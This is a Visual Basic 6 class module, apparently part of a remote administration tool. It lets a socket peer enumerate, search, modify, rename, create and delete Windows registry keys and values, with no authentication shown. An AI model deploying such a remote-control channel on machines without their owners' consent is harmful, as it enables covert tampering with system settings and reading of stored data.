VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
  Persistable = 0  'NotPersistable
  DataBindingBehavior = 0  'vbNone
  DataSourceBehavior  = 0  'vbNone
  MTSTransactionMode  = 0  'NotAnMTSObject
END
Attribute VB_Name = "ClsRemoteRegistry"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = True
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Option Explicit

Private Const Delimiter As String = "|"
Private Const Delim2 As String = "#%."
Private Const Delim3 As String = "@&|?"
Private Const END_DATA As String = "¡@#@!"

Private WithEvents clsReg       As clsRegistry
Public ID_Connection            As Long

Private m_Data                  As String

Private Sub Class_Initialize()
    Set clsReg = New clsRegistry
End Sub

Private Sub Class_Terminate()
    If ID_Connection Then WinSock32.WsClose ID_Connection
    clsReg.CancelSearch
    Set clsReg = Nothing
End Sub

Public Sub Socket_DataArrival(ID As Long, IP As String, Puerto As String, Data As String)
    'On Error GoTo ErrHaddle
    
    Dim lRet1       As Long
    Dim lRet2       As Long
    Dim sCommand    As String
    Dim sBuf        As String
    
    
    m_Data = m_Data & Data

    lRet1 = InStr(m_Data, END_DATA)
    
    If lRet1 Then
   
        sBuf = Left$(m_Data, lRet1 - 1)
        m_Data = Mid$(m_Data, lRet1 + Len(END_DATA))

        lRet2 = InStr(sBuf, Delimiter)
        sCommand = Left$(sBuf, lRet2 - 1)
        sBuf = Mid$(sBuf, lRet2 + 1)

        Select Case sCommand
    
            Case 0 'Send Key Registry
                SendRegKeys sBuf
            Case 1 'Send Value Registry
                SendRegValue sBuf
            Case 2 'Modify Local Value
                If ModifyRegValue(sBuf) Then
                    WinSock32.SendData ID_Connection, "4" & Delimiter & "1" & Delim2 & vbNullString & END_DATA
                Else
                    WinSock32.SendData ID_Connection, "4" & Delimiter & "0" & Delim2 & vbNullString & END_DATA
                End If
                
            Case 3 'Delete value
                If DeleteRegValue(sBuf) Then
                    WinSock32.SendData ID_Connection, "4" & Delimiter & "1" & Delim2 & vbNullString & END_DATA
                Else
                    WinSock32.SendData ID_Connection, "4" & Delimiter & "0" & Delim2 & vbNullString & END_DATA
                End If
                
            Case 4 'Rename value
                If RenameRegValue(sBuf) Then
                    WinSock32.SendData ID_Connection, "4" & Delimiter & "1" & Delim2 & vbNullString & END_DATA
                Else
                    WinSock32.SendData ID_Connection, "4" & Delimiter & "0" & Delim2 & vbNullString & END_DATA
                End If
                
            Case 5
                If RenameRegKey(sBuf) Then
                    WinSock32.SendData ID_Connection, "4" & Delimiter & "1" & Delim2 & vbNullString & END_DATA
                Else
                    WinSock32.SendData ID_Connection, "4" & Delimiter & "0" & Delim2 & vbNullString & END_DATA
                End If
                
            Case 6
                If clsReg.CreateKey(sBuf) Then
                    WinSock32.SendData ID_Connection, "4" & Delimiter & "1" & Delim2 & vbNullString & END_DATA
                Else
                    WinSock32.SendData ID_Connection, "4" & Delimiter & "0" & Delim2 & vbNullString & END_DATA
                End If
                
             Case 7
                If CreateRegValue(sBuf) Then
                    WinSock32.SendData ID_Connection, "4" & Delimiter & "1" & Delim2 & vbNullString & END_DATA
                Else
                    WinSock32.SendData ID_Connection, "4" & Delimiter & "0" & Delim2 & vbNullString & END_DATA
                End If
                
            Case 8
                If clsReg.KillKey(sBuf) Then
                    WinSock32.SendData ID_Connection, "4" & Delimiter & "1" & Delim2 & vbNullString & END_DATA
                Else
                    WinSock32.SendData ID_Connection, "4" & Delimiter & "0" & Delim2 & vbNullString & END_DATA
                End If
            Case 9
                Call Search(sBuf)
            Case 10
                clsReg.CancelSearch
            
            End Select

        If Len(m_Data) Then
            If InStr(m_Data, END_DATA) Then Call Me.Socket_DataArrival(ID, IP, Puerto, vbNullString)
        End If
        
    End If
    
ErrHaddle:
End Sub

Private Sub Search(ByVal sData As String)
    Dim vData() As String
    
    vData = Split(sData, Delimiter)
    
    With clsReg
        .CancelSearch
        .SetSearchOption vData(0), vData(1), vData(2), vData(3), True
        .StarSearch vData(4)
    End With
    WinSock32.SendData ID_Connection, "6" & Delimiter & END_DATA
End Sub

Private Function CreateRegValue(ByVal sData As String) As Boolean
    On Error GoTo Handler
    Dim vData() As String
    vData = Split(sData, Delim2)
    CreateRegValue = clsReg.CreateValue(vData(0), vData(1), vData(2))
Handler:
End Function

Private Function RenameRegKey(ByVal sData As String) As Boolean
    On Error GoTo Handler
    Dim vData() As String
    vData = Split(sData, Delim2)
    RenameRegKey = clsReg.RenameKey(vData(0), vData(1))
Handler:
End Function

Private Function RenameRegValue(ByVal sData As String) As Boolean
    On Error GoTo Handler
    Dim vData() As String
    vData = Split(sData, Delim2)
   
    RenameRegValue = clsReg.RenameValue(vData(0), vData(1), vData(2))
Handler:
End Function

Private Function DeleteRegValue(ByVal sData As String) As Boolean
    On Error GoTo Handler
    Dim vData() As String
    
    vData = Split(sData, Delim2)
    DeleteRegValue = clsReg.KillValue(vData(0), vData(1))
Handler:
End Function

Private Function ModifyRegValue(ByVal sData As String) As Boolean
    On Error GoTo Handler
    Dim vData() As String

    vData = Split(sData, Delim2)
    Debug.Print vData(0), vData(1), vData(3)
    ModifyRegValue = clsReg.WriteValue(vData(0), vData(1), vData(3))
Handler:
End Function


Private Sub SendRegValue(ByVal sPath As String)
    Dim vData() As Variant
    Dim sNames() As String
    Dim arrTypes() As Long
    Dim lCount As Long
    Dim i As Long
    Dim sData As String
    
    lCount = clsReg.EnumValues(sPath, sNames, arrTypes, vData, True)


    If lCount > 0 Then
     
        For i = 0 To lCount - 1
            sData = sData & sNames(i) & Delim2 & arrTypes(i) & Delim2 & vData(i) & Delim3
            If Len(sData) > 1024 Then
                WinSock32.SendData ID_Connection, "2" & Delimiter & sData & END_DATA
                sData = vbNullString
            End If
        Next
        
        If Len(sData) > 0 Then
            WinSock32.SendData ID_Connection, "2" & Delimiter & sData & END_DATA
        End If

    End If

    WinSock32.SendData ID_Connection, "3" & Delimiter & END_DATA
End Sub




Private Sub SendRegKeys(ByVal sPath As String)

    Dim sKeys() As String, nKeys As Long
    Dim HavSubKey As Long
    Dim i As Long
    Dim sData As String
    
    nKeys = clsReg.EnumKeys(sPath, sKeys)

    If nKeys > 0 Then
        'WinSock32.SendData ID_Connection, "0" & Delimiter
        For i = 0 To nKeys - 1
        
            If clsReg.HaveSubKey(sPath & "\" & sKeys(i)) Then
                HavSubKey = 1
            Else
                HavSubKey = 0
            End If
            
            sData = sData & sKeys(i) & vbCrLf & HavSubKey & Delimiter
            
            If Len(sData) > 1024 Then
                WinSock32.SendData ID_Connection, "0" & Delimiter & sData & END_DATA
                sData = vbNullString
                
            End If
            
        Next
        If Len(sData) Then
            WinSock32.SendData ID_Connection, "0" & Delimiter & sData & END_DATA
        End If
        WinSock32.SendData ID_Connection, "1" & Delimiter & END_DATA
    End If
 
End Sub


Public Sub Socket_Close(ID As Long, IP As String, Puerto As String)
    ID_Connection = 0
End Sub

Public Sub Socket_Conect(ID As Long, IP As String, Puerto As String)
    
End Sub

Private Sub clsReg_SearchFound(ByVal key As String, ByVal Value As String, ByVal RegType As rcRegType, ByVal Data As Variant)
    WinSock32.SendData ID_Connection, "5" & Delimiter & key & Delim2 & Value & Delim2 & RegType & Delim2 & Data & END_DATA
End Sub
